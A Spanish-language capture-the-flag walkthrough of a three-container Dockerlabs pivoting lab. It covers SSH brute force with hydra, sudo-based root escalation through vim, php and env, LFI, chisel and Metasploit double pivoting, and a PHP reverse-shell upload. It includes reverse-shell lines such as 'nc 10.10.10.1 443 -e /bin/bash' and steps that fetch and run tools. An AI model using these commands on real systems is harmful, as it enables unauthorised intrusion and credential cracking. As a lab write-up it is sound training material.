# Máquina Little Pivoting

Dificultad -> Media

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con varios archivos, un .sh y varios .tar, qe son varias máquinas que debemos explotar y pivotar entre ellas.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Máquinas

Para el despliegue de la máquina tendremos que hacer lo siguiente:

Descomprimimos el .zip
```bash
unzip LittlePivoting
```

2. Damos permisos de ejecución al archivo “auto_deploy.sh” 
```bash
chmod +x auto_deploy.sh
```

3. Desplegamos el entorno.
```bash
sudo bash auto_deploy.sh trust.tar upload.tar inclusion.tar
```

Este es el esquema de red que tenemos:

<img width="817" height="138" alt="imagen" src="https://github.com/user-attachments/assets/e97c81e0-262f-45a5-9e0b-d847177daedd" />


### Trust
Vamos a empezar por vulnerar la máquina trust. Para ello escaneamos la máquina:
```bash
nmap -SCV -p- --open --min-rate 5000 10.10.10.2 -vvv
```

Encontramos abiertos los puertos 22 y 80.


Para poder obtener información acerca de la página que tienen alojada en la IP, vamos a usar fuzzing, que es una técnica que consiste en enviar datos aleatorios, inesperados o mal formados a un programa, servicio o aplicación para ver cómo responde. El objetivo principal es detectar errores, vulnerabilidades o fallos de seguridad.

Para ello vamos a utilizar la herrmaienta de fuzzing web gobuster para encontrar archivos o directorios web dentro de la página:


He probado distintas combinaciones en gobuster para ver si encontraba algo y he encontrado un php con el siguiente comando:
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]  
/server-status        (Status: 403) [Size: 275
 ```

Este comando utiliza una wordlist que le proporcionamos con el parámetro -w para probar posibles directorios y archivos en la web.
El parámetro -t indica el número de hilos concurrentes, acelerando el proceso de búsqueda.
La opción -x permite probar diferentes extensiones (por ejemplo, .php, .html) sobre cada palabra de la wordlist.

En conjunto, Gobuster intenta encontrar archivos o directorios en la URL o IP que le indicamos, que en este caso corresponde a la máquina objetivo donde está alojada la página web y la plantilla de Apache.

![Gobuster](/images/gobuster_1.png)

Al acceder a /secret.php podemos ver lo siguiente:

<img width="425" height="276" alt="imagen" src="https://github.com/user-attachments/assets/3edc8cb4-3510-4d84-9226-e92492f830b9" />


Ya tenemos un usuario con el que probar fuerza bruta en ssh.

Podemos probar hydra ahora con mario para ver si encontramos alguna password. 
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
```
 Encontramos la password chocolate para mario. Entramos a su sesión:
 ```bash
ssh mario@10.10.10.2
```

Ahora vamos a intentar escalar privilegios. 
```bash
find / -perm 4000 -type f 2>/dev/null
cat /etc/crontab
sudo -l
```

Con `sudo -l` vemos que podemos ejecutar vim con mario como si fuésemos root. Por tanto vamos a entrar a vim y podemos ejecutar una bash como root:
```bash
sudo vim hola

# En la sección de abajo donde se guarda con :wq! ponemos:
:!bash
```
Se nos ejecuta una shell de root. Ya somos root en la primera máquina. Vamos ahora a descubrir la nueva máquina intermedia a partir de esta.

Desde trust miramos la red a ver que tenemos:
```bash
ifconfig
```

Encontramos esto:

<img width="851" height="543" alt="imagen" src="https://github.com/user-attachments/assets/73c5901f-2920-4219-a22b-87ab500507a7" />

Tenemos dos interfaces de red. Una a la máquina Kali y otra a otra red interna a la que Kali no va tener acceso. 

Si hacemos un ping desde Kali a la nueva interfaz no funciona puesto que no hay conexión:

<img width="544" height="108" alt="imagen" src="https://github.com/user-attachments/assets/bcd79f63-bd76-4fb6-bc3f-bf9cc1ca353e" />

Por tanto, usaremos la máquina trust como pivote para acceder desde la Kali a la red 20.20.20.2 y descubrir hosts.

Vamos a hacer en nuestro Kali un script para descubrir puertos y se lo pasaremos a la máquina trust:
```bash
cd /Desktop/dockerlabs
nano script.sh

#!/bin/bash

for host in $(seq 1 254); do
    {
        timeout 1 bash -c "echo '' > /dev/tcp/20.20.20.$host/80" &>/dev/null &&
        echo "[+] HOST - 20.20.20.$host"
    } &
done

wait
```
Con esto encontramos un nuevo host en la nueva red:

<img width="446" height="132" alt="imagen" src="https://github.com/user-attachments/assets/42072415-3f62-4821-97c2-43dde565fea4" />

Puede ser el siguiente objetivo a atacar. 

Vamos primero a usar chisel para ver como pivotamos:
```bash
# Kali
which chisel   /usr/bin/chisel
chisel server --reverse -p 8000

cp $(which chisel) /tmp/chisel
python3 -m http.server 8001 --directory /tmp


# En Trust
cd /tmp
wget http://10.10.10.1:8001/chisel -O chisel
chmod +x chisel

./chisel client 10.10.10.1:8000 R:socks


# Otra terminal de Kali: configurar proxychains
nano /etc/proxychains4.conf
# comentar la última línea: socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
```

Probar el pivoting desde Kali:
```bash
proxychains curl http://20.20.20.3
proxychains nmap -sT -Pn 20.20.20.3
```

Tras el último nmap encontramos los siguientes puertos abiertos en la máquina: 22 y 80 de nuevo.

Si queremos ver la web, cerramos la sesión de firefox y:

Ajustes → General → Configuración de red → Configuración

Selecciona:
```text
Configuración manual del proxy
Proxy SOCKS: 127.0.0.1
Puerto: 1080
SOCKS v5
Activa Proxy DNS al usar SOCKS v5
```

Se puede hacer también con FoxyProxy:
<img width="1100" height="436" alt="imagen" src="https://github.com/user-attachments/assets/fe648baf-a284-43bf-8929-6ae1fc212e7c" />

Para hacer fuzzing debemos especificar ciertos parámetros:
```bash
gobuster dir \
-u http://20.20.20.3/ \
-w /usr/share/wordlists/dirb/common.txt \
--proxy socks5://127.0.0.1:1080
```

Con esto encontramos una ruta nueva en /shop. Nos lleva aquí:

<img width="1356" height="578" alt="imagen" src="https://github.com/user-attachments/assets/933f8c92-7fe0-4630-9932-8c0ac281845f" />

Vemos abajo una línea que dice: `"Error de Sistema: ($_GET['archivo']"); 

Eso significa que el código PHP está intentando leer un parámetro GET llamado archivo.

Por ejemplo: `/index.php?archivo=algo`

Probando lfi obtenemos el `/etc/passwd` con esto: http://20.20.20.3/shop/index.php?archivo=../../../../etc/passwd

<img width="729" height="429" alt="imagen" src="https://github.com/user-attachments/assets/59dcc5d0-2f24-4d3c-a5a7-066b8d4b070d" />

De aquí sacamos 2 usuarios que tienen bash: seller y manchi. Como ssh está activo probamos fuerza bruta sobre ssh con ambos users.
```bash
# en kali
nano users.txt

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://20.20.20.3
```
Encontramos una password para manchi y otro para seller:

<img width="870" height="76" alt="imagen" src="https://github.com/user-attachments/assets/f222128e-e0ad-4209-8f75-d700a67e3dc2" />

```bash
proxychains ssh manchi@20.20.20.3
```
Estamos dentro de la tercera máquina.



### Inclusion

Tenemos que escalar privs. En la búsqueda del bit setuid detectamos lo siguiente:
<img width="852" height="237" alt="imagen" src="https://github.com/user-attachments/assets/184cfc6e-18a0-4eec-968d-39f2eb38648e" />


Tras enumerar distintas técnicas de escalda de privilegios vemos que es difícil escalar en esta máquina. Quizás tenemos que entrar con el user seller. Vamos a miras si se encuentra el usuario en el `/etc/passwd`.

```bash
cat /etc/passwd   # vemos a seller
```

```bash
# En kali
cd /tmp
wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
cp /usr/share/wordlists/rockyou.txt /tmp/

ls -l /tmp/Linux-Su-Force.sh
python3 -m http.server 4444 --directory /tmp


# En mario (trust)
wget http://10.10.10.1:4444/Linux-Su-Force.sh
wget http://10.10.10.1:4444/rockyou.txt
python3 -m http.server 4444

# En manchi (inclusion)
wget http://20.20.20.2:4444/Linux-Su-Force.sh
wget http://20.20.20.2:4444/rockyou.txt
chmod +x Linux-Su-Force.sh

# ejecutarlo en manchi:
./Linux-Su-Force.sh seller rockyou.txt
```

<img width="552" height="51" alt="imagen" src="https://github.com/user-attachments/assets/e9448c39-222c-4f42-abfe-177328984a20" />

Encontramos la password de seller. 
```bash
su seller
```

Somos seller ahora. Probamos aquí la escalada de privilegios:
```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
cat /etc/crontab
```

En el sudo -l encontramos algo muy interesante:
<img width="1225" height="153" alt="imagen" src="https://github.com/user-attachments/assets/e620ea08-b137-4e75-a4f7-7bfe40789156" />

Podemos ejecutar el binario php de root con el usuario seller. 
```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

Somos root. Hemos completado la máquina Inclusion. Vamos a descubrir la última máquina y a pivotar sobre ella. 

Probamos varios comandos, pero alguos de red no funcionan:

<img width="1415" height="534" alt="imagen" src="https://github.com/user-attachments/assets/1c32e224-eecb-464d-8348-49236ec15e63" />


No podemos ver la nueva interfaz, pero viendo la ip de la máquna en /etc/hosts sabemos que puede ser 30.30.30.x. Por tanto vamos a tirar por ahí y ejecutar un script para localizar hosts en la nueva red interna y usar esta máquina y la anterior de pivote.

```bash
echo '#!/bin/bash
for host in $(seq 1 254); do
    {
        timeout 1 bash -c "echo > /dev/tcp/30.30.30.$host/80" 2>/dev/null &&
        echo "[+] HOST - 30.30.30.$host"
    } &
done
wait' > scan.sh

# permisos y ejecución
chmod +x scan.sh
./scan.sh
```

<img width="478" height="92" alt="imagen" src="https://github.com/user-attachments/assets/23b25ab2-cdf5-4f8a-93ac-cd3036be44d3" />

Como vimos ya en el /etc/hosts su IP en esta nueva red es la .2, la nueva IP encontrado a la que queremos finalmente acceder es a la 30.30.30.3. De nuevo deberemos hacer pivoting pero esta vez con 2 pivotes. 

Ya tenemos Chisel entre Kali y Trust. Lo que vamos a hacer ahora es crear otro túnel Chisel entre Trust e Inclusion. 

| Pero hay un detalle importante: para que Inclusion pueda recibir el segundo Chisel, necesitamos que Trust pueda conectarse a Inclusion, y ya sabemos que: Trust = 20.20.20.2 e Inclusion = 20.20.20.3

```bash
## PRIMER TÚNEL
# En Kali debe seguir funcionando su chisel
chisel server --reverse -p 8000

# Trust
./chisel client 10.10.10.1:8000 R:socks
```

Para el segundo túnel necesitamos que Inclusion tenga el binario de Chisel. Como ya lo tenemos en /tmp de Trust podemos pasarlo a Inclusion mediante el servidor HTTP. 
```bash
# Trust (mario)
cd /tmp
ls
python3 -m http.server 8002

# Inclusion (seller-root)
cd /tmp
wget http://20.20.20.2:8002/chisel
chmod+x chisel
```

```bash
# SEGUNDO TÚNEL
# Trust
./chisel server --reverse -p 9000

# Inclusion
./chisel client 20.20.20.2:9000 R:20.20.20.2:1081:socks
```

Configuramos el Proxychains en Kali:
```bash
sudo nano /etc/proxychains4.conf

# Abajo
strict_chain

[ProxyList]
socks5 127.0.0.1 1080
socks5 20.20.20.2 1081
```

Ya estaría la conexión. Podemos hacer ahora desde nuestro Kali un nmap a la última máquina:
```bash
proxychains nmap -sT -Pn -p- --open 30.30.30.3
```
Tras un largo escaneo (para acabar antes pero con menos puertos podemos quitar el -p-), encontramos un único servicio activo, el puerto 80 HTTP. 


Podemos ver la web con curl. En firefox no funciona porque:
```bash
Firefox
 ↓
SOCKS 127.0.0.1:1080
 ↓
SOCKS 20.20.20.2:1081
 ↓
30.30.30.3
```

Vamos a crear un túnel accesible en Kali firefox.  En Inclusion, donde tienes Chisel conectado a Trust, puedes hacer que Trust exponga directamente el puerto 80 del objetivo. Creamos otro túnel específico:
```bash
# Trust
./chisel server --reverse -p 9001

# Inclusion
./chisel client 20.20.20.2:9000 R:8080:30.30.30.3:80
```
Pero esto sustituiría el R:...:socks del segundo túnel, así que para tu writeup de doble pivot + navegador, te recomiendo mantener el SOCKS y crear un forwarding adicional.
 
Iniciar firefox desde el user Kali.
```bash
proxychains firefox
```
Quitar el settings el proxy. 

Nos encontramos la siguiente web:

<img width="1588" height="415" alt="imagen" src="https://github.com/user-attachments/assets/e0ffd60a-4f66-4081-b2d6-4c90793cd877" />

Todo apunta a que la vulnerabilidad de la web es un File Upload. Vemos que la web es php, por lo que intentaremos subir un archivo de este tipo que se pueda ejecutar en el servidor. 

Antes de nada, en una web tiramos siempre fuzzing:

<img width="750" height="269" alt="imagen" src="https://github.com/user-attachments/assets/72c3f883-1088-487f-90c8-d86dc9267837" />

Encontramos una ruta de los archivos que subimos: /uploads. 

Subiremos una reverse shell php:
```bash
cd /usr/share/webshells/php
sudo nano php-reverse-shell

# cambiar
$ip = "30.30.30.2";
$port = 1234;
```

Haremos lo siguiente:
```bash
# en kali
nc -lvnp 1234

# Trust
./chisel client 10.10.10.1:8000 1234:127.0.0.1:1234

# Inclusion
./chisel client 20.20.20.2:9000 1234:127.0.0.1:1234
```
 Ahora vamos a la ruta /uploads y clicamos sobre la reverse shell para que se ejecute:
 <img width="1309" height="378" alt="imagen" src="https://github.com/user-attachments/assets/499ec3e2-e9f7-4f79-ab32-20808fb5958b" />

Si volvemos al listener de kali, veremos que tenemos una sesión. Hemos conseguido acceder al servidor.
<img width="1412" height="284" alt="imagen" src="https://github.com/user-attachments/assets/545df2a8-8029-462b-96d9-e0aafc616398" />

Resumen de cómo quedó aquí el pivoting para poder obtener la shell de la 30.30.30.3 en nuestro Kali 10.10.10.1:

- La reverse shell del servidor final 30.30.30.3 intenta conectarse a 30.30.30.2:1234, que es Inclusion.
- Inclusion (30.30.30.2) redirige el tráfico del puerto 1234 hacia Trust (20.20.20.2:1234).
- Trust (20.20.20.2) redirige ese tráfico hacia Kali (10.10.10.1:1234).
- Kali escucha en 1234 con `nc -lvnp 1234`

Finalmente, Kali recibe la conexión con:

nc -lvnp 1234


### Upload
Hemos conseguido acceso a la última máquina. Solo nos queda escalar privilegios:

```bash
sudo -l
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null
# ejecutar linpeas.sh
```

Con `sudo -l` encontramos algo interesante:
```bash
(root) NOPASSWD: /usr/bin/env
```

Podemos escalar privs con eso. Buscamos env en GTFOBins y encontramos: env /bin/sh . Usando la ruta y sudo:
```bash
sudo /usr/bin/env bin/sh -p
```

Máquina completada: ✅

---

## Pivoting con Metasploit

Vamos a partir de la máquina Kali para practicar el pivoting con Metasploit:

Para obtener un meterpreter de la primera máquina sabemos que tenemos que acceder a través de ssh. Para ello usaremos metasploit para obtener una sesión con las credenciales de mario:
```bash
msfconsole
use /scanner/ssh/ssh_login
options
set RHOSTS 10.10.10.2
set USERNAME mario
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCESS true
run
```
Nos encuentra la password y nos crea una sesión:
<img width="1585" height="330" alt="imagen" src="https://github.com/user-attachments/assets/05e001f3-4af3-44c4-a869-42cf6f128216" />

Nos conectamos a la sesión (ya tendríamos acceso a la primera máquina) y vamos a empezar el pivoting con Metasploit:
```bash
sessions -i 1
```

**Otra opción de acceder a la sesión en Metasploit y convertirla en Meterpreter**

Si en vez de usar el módulo de Metasploit, usásemos hydra como usamos al principio podemos entrar a la cuenta de mario de forma normal con ssh:
```bash
ssh mario@10.10.10.2
```
Aquí estaríamos dentro de la shell de mario. Desde aquí podemos pasarle esta shell a Metasploit.

En Metasploit usamos el `multi/handler` y nos ponemos en escucha, mientras que en la shell de mario nos envíamos una shell.
```
# Metasploit
msfconsole
use /multi/handler
options
set LHOST 10.10.10.1   # nuestra máquina atacante Kali
set RPORT 443   # puerto cualquiera
run

# En la shell de mario
nc 10.10.10.1 443 -e /bin/bash
```

En el multi handler aunque parece que no hay nada tenemos una shell. Podemos escribir comandos ya. Al igual que la shell que obtuvimos con el módulo ssh_login, es una shell de tipo normal, no es una meterpreter. Hay que convertirla. 

### Trust

Aquí estamos accediendo a una sesión shell normal, no a una Meterpreter. Por tanto usaremos un módulo que nos cambie de shell de a meterpreter:
```bash
use multi/manage/shell_to_meterpreter
options
set LHOST 10.10.10.1
set SESSION 1
run

# Cuando funciona
sessions -i 2
```

Ya tenemos una sesión meterpreter. Desde aquí ahora iniciaremos el pivoting. 

```bash
# En Meterpreter
ipconfig     # vemos una nueva interfaz de red 20.20.20.2
```

Por tanto desde Trust podemos alcanzar Inclusion. 

Ahora ejecutaremos lo siguiente (hay dos comandos, elegir uno)
```bash
# Elegir un comando
run autoroute -s 20.20.20.0/24

route add 20.20.20.0 255.255.255.0 2
```

autoroute: script de metasploit para gestionar rutas

-s: indica la subred que queremos añadir

20.20.20.0/24: red interna que queremos alcanzar (equivalente en el route add a 20.20.20.0 255.255.255.0 (esto es /24))

El autoroute de todas formas está un poco deprecado. Funciona, pero Metasploit recomienda usar el módulo: `post/multi/manage/autoroute`

Ahora salimos de la sesión (Ctrl+Z) y podemos ver las rutas con `route`.

Ahora Metasploit sabe que para llegar a cualquier IP 20.20.20.X debe utilizar la sesión Meterpreter 2.

Vamos a usar dos módulos para escanear máquinas en la red nueva que acabamos de añadir a Metasploit:
```bash
use auxiliary/scanner/discovery/arp_sweep
set SESSION <ID>
set RHOSTS <RANGO_IP> # Ejemplo: 20.20.20.0/24
run
```

Esto por si solo hace un barrido arp para encontrar hosts. Ya solo con esto encontramos una nueva IP en la red interna: 20.20.20.3. Con otro módulo especificando puerto podemos comprobarlo:

```bash
use auxiliary/scanner/portscan/tcp
options
set RHOSTS 20.20.20.0/24
set PORTS 80
set THREADS 20
set CONCURRENCY 10
set TIMEOUT 500
run
```

<img width="589" height="326" alt="imagen" src="https://github.com/user-attachments/assets/01a80a15-6e1d-4b38-8133-3cf918c3f340" />

Vamos a escanear esta máquina solo ahora:
```bash
set RHOSTS 20.20.20.3
set PORTS 1-65535
run
```

Ahora en esta máquina nos encuentra abiertos el puerto 22 y el puerto 80.

<img width="726" height="125" alt="imagen" src="https://github.com/user-attachments/assets/9993c7d9-d967-4e80-8130-a1984355a9c2" />

Estamos consiguiendo alcanzar la IP a través de nuestra máquina Kali puesto que en Metasploit tenemos añadidas las rutas a través de la sesión (donde está Trust) que si que tiene acceso a la nueva red.

Ahora queremos vulnerar esta máquina. Lo suyo sería probar la web en el navegador por ejemplo, pero no funcionará porque no tenemos acceso en nuestro Kali. Por eso, utilizaremos ahora port forwarding para redireccionar esos puertos a otros puertos de nuestro Kali y así poder acceder a la máquina. El pivoting de esta máquina ya lo hemos hecho, ahora tenemos que hacer port forwarding.

**PORT FORWARDING**

Ahora queremos vulnerar esta máquina. Lo suyo sería probar la web en el navegador por ejemplo, pero no funcionará porque no tenemos acceso en nuestro Kali. Por eso, utilizaremos ahora port forwarding para redireccionar esos puertos a otros puertos de nuestro Kali y así poder acceder a la máquina. 

Y aquí hay una diferencia importante respecto a Chisel: con Meterpreter podemos utilizar `portfwd`.

Sabemos que la máquina nueva tiene el puerto 80 abierto y queremos ver su web. Lo que vamos a hacer es que cuando accedamos a nuestro localhost:8080 se nos rediriga al puerto 80 de la máquina remota 20.20.20.3.

Ejecutamos en meterpreter:
```bash
portfwd add -l 8080 -p 80 -r 20.20.20.3 
```

-l: local
-p: port
-r: remote 

Para ver los port forwardings:
```bash
portfwd list
```

<img width="748" height="288" alt="imagen" src="https://github.com/user-attachments/assets/28f73a87-b003-4257-8281-ca1772020cf8" />

Ahora si accedemos a localhost:8080 en nuestro navegador de Kali podemos acceder a la web de la máquina 20.20.20.3:

<img width="788" height="702" alt="imagen" src="https://github.com/user-attachments/assets/e4ac29e7-e13f-418c-8874-3e4a89d2b8fc" />


Como ya vimos en la resolución de chisel es simplemente una plantilla de Apache. 

